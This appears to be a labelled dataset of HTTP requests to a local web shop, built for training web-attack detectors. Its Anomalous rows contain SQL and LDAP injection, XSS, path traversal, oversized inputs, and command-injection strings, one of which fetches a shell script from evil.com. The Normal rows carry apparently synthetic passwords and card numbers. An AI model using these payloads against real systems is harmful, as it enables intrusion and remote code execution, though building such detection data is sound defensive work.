Unnamed: 0,Method,User-Agent,Pragma,Cache-Control,Accept,Accept-encoding,Accept-charset,language,host,cookie,content-type,connection,lenght,content,classification,URL
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=DFD1BD036EFEDE1EB25A98AFD2AD128E,,close,,,1,http://localhost:8080/tienda1/privado/listaCompras.jsp?id=2160&user_id=1 HTTP/1.1
Normal,GET,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=2DEA1922FB3A6D50DB23EADB4EAFB1BC,,close,,,0,http://localhost:8080/tienda1/publico/buscar.jsp?id=24&nombre=Jamon+Iberico&precio=190&cantidad=59&B1=A%C3%B1adir+al+carrito HTTP/1.1
Anomalous,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=66882AFD61A7A8D3D7FBEFBDAAEACEEF,,close,,,1,http://localhost:8080/tienda1/publico/buscar.jsp?query=javascript%3Aalert%281%29 HTTP/1.1
Anomalous,POST,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=6A76AFAEA60E2ED4E4F514DD67ED0B6A,application/x-www-form-urlencoded,close,67,correo=%2A%29%28uid%3D%2A%29%29%28%7C%28uid%3D%2A&password=anything,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous,GET,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=1A60B8D4DCBDA0DD6572A958CEDA7135,,close,,,1,http://localhost:8080/tienda1/privado/listaCompras.jsp?id=4473&user_id=1 HTTP/1.1
Normal,POST,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=5BC8452CC5C2B4B0BAA8D58C617A5EDE,application/x-www-form-urlencoded,close,37,correo=ana@mail.com&password=FpY5BP8d,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal,POST,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=FA11F4CF7F19BAC48A26401E7E1642FC,application/x-www-form-urlencoded,close,40,correo=carlos@mail.com&password=B6FZZR67,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous,GET,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=AB1D2F5E091B4899C7BDE5315A1AFE5C,,close,,,1,http://localhost:8080/tienda1/publico/buscar.jsp?query=item%3B%20wget%20http%3A//evil.com/shell.sh HTTP/1.1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=F18ABEE99EA69BB1B17CD5EC12B96ACB,application/x-www-form-urlencoded,close,71,correo=1%20OR%20BENCHMARK%281000000%2CMD5%281%29%29--&password=anything,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal,POST,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=8BFABEABD6FC2ED9AB7A1D7B7FC74B4A,application/x-www-form-urlencoded,close,47,tarjeta=8729541687203335&mes=10&anio=25&cvv=955,0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
Anomalous,POST,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=B30C4A74FE47040A418F4C3D407AEF45,application/x-www-form-urlencoded,close,35,correo=admin%27--&password=anything,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=EACE9A44DBBAFBB7E8DFCCDAD8ACE1F6,application/x-www-form-urlencoded,close,37,correo=ana@mail.com&password=yPwPoX3S,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal,POST,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=F1EBED95BF6BBF0B59AE0FA86CA81335,application/x-www-form-urlencoded,close,47,tarjeta=5129507308048980&mes=07&anio=29&cvv=879,0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
Anomalous,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=B04485E2B7B34BEBC1C2E06A22D7295D,,close,,,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=../../../../../../WEB-INF/web.xml HTTP/1.1
Normal,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=3DC21FFB5C7F34EE737A1ADD379DCEE4,,close,,,0,http://localhost:8080/tienda1/publico/buscar.jsp?query=cerveza HTTP/1.1
Normal,GET,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=C5BCE52B16CBD546C2F2B1CE9DD2FACC,,close,,,0,http://localhost:8080/tienda1/index.jsp HTTP/1.1
Normal,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=FFF191ED1F5BA5DFDD4EDE36A9C3E0E2,,close,,,0,http://localhost:8080/tienda1/publico/buscar.jsp?id=42&nombre=Cerveza+Artesanal&precio=223&cantidad=94&B1=A%C3%B1adir+al+carrito HTTP/1.1
Normal,GET,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=AF2F9351AAE0A39B0FFCDC1E7EEB65DC,,close,,,0,http://localhost:8080/tienda1/publico/buscar.jsp?query=vino HTTP/1.1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=C253EBFCD2F968DF024DA3833A165ABF,application/x-www-form-urlencoded,close,37,correo=ana@mail.com&password=mwjwKj1m,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal,POST,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=B4DED6FC7990FC2FE3A34BBA522CF9D4,application/x-www-form-urlencoded,close,39,correo=maria@mail.com&password=xU5689Ef,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=84B11A86EFD551AB2CBBFFBFBB832DBA,,close,,,1,http://localhost:8080/tienda1/publico/buscar.jsp?query=%3Csvg%20onload%3Dalert%28document.domain%29%3E HTTP/1.1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=35B548E2EB9DDAD90A1DC8FF44AB8F34,application/x-www-form-urlencoded,close,37,correo=ana@mail.com&password=zBTuGYeH,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=0FACBABBCCF11ED85A30630BF3C9CBAC,application/x-www-form-urlencoded,close,47,tarjeta=2411922326679337&mes=08&anio=26&cvv=286,0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
Normal,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=E05FCCB16E07684AFFF28A2B3C8CC63A,,close,,,0,http://localhost:8080/tienda1/publico/buscar.jsp?query=cerveza HTTP/1.1
Normal,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=AC7DBA8FAABBB4BE3FB0AF9B7E998DDE,,close,,,0,http://localhost:8080/tienda1/index.jsp HTTP/1.1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=542DB7B8CDF7EBABBBBFC5BF06CD94F5,application/x-www-form-urlencoded,close,38,correo=admin%7C%20whoami&password=pass,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=2BFFFE740DE877A2EF2BE1D089FF2BD0,,close,,,0,http://localhost:8080/tienda1/publico/anadir.jsp?id=45&nombre=Jamon+Iberico&precio=465&cantidad=99&B1=A%C3%B1adir+al+carrito HTTP/1.1
Anomalous,POST,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=F61CEC273B982855E7DBFE5E5FCBEAAA,application/x-www-form-urlencoded,close,936,correo=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&password=pass,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal,GET,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=B65867C6BDC7E7E4F6D2792CC4FB851F,,close,,,0,http://localhost:8080/tienda1/index.jsp HTTP/1.1
Normal,GET,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=5D37C6AABA60EBF471ADEABC9DAA88C4,,close,,,0,http://localhost:8080/tienda1/publico/anadir.jsp?id=4&nombre=Cerveza+Artesanal&precio=153&cantidad=50&B1=A%C3%B1adir+al+carrito HTTP/1.1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=A2CA4DDE5DC8F33D19AC0B36A4A19C43,application/x-www-form-urlencoded,close,44,correo=admin%3B%20ls%20-la%20/&password=pass,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal,GET,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=3A976D7ABE24BC435ED312BEBFFE8EF5,,close,,,0,http://localhost:8080/tienda1/publico/autenticar.jsp?id=16&nombre=Jamon+Iberico&precio=158&cantidad=80&B1=A%C3%B1adir+al+carrito HTTP/1.1
Normal,GET,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=6CCF8CF2ABFEFD1FEF574E732C0FA402,,close,,,0,http://localhost:8080/tienda1/publico/autenticar.jsp?id=32&nombre=Cerveza+Artesanal&precio=17&cantidad=80&B1=A%C3%B1adir+al+carrito HTTP/1.1
Anomalous,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=9B3CCE0525A7A9CEFD5DA2ACF725BBA3,,close,,,1,http://localhost:8080/tienda1/publico/buscar.jsp?id=%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541 HTTP/1.1
Normal,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=6B6E6DF31AFDD6DC2AF4BAEC1DCEFECB,,close,,,0,http://localhost:8080/tienda1/index.jsp HTTP/1.1
Normal,POST,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=93F09A15D48CA5C0AFC4A2A24FD4E6D5,application/x-www-form-urlencoded,close,40,correo=carlos@mail.com&password=WZiT8MB0,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal,GET,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=F3788C3ADA9E892EECFBC160ACD0ECD1,,close,,,0,http://localhost:8080/tienda1/publico/autenticar.jsp?id=34&nombre=Cerveza+Artesanal&precio=361&cantidad=35&B1=A%C3%B1adir+al+carrito HTTP/1.1
Anomalous,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=5CA9B636BF3F70C2A59CED743E1CE9A5,,close,,,1,http://localhost:8080/tienda1/publico/buscar.jsp?query=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E HTTP/1.1
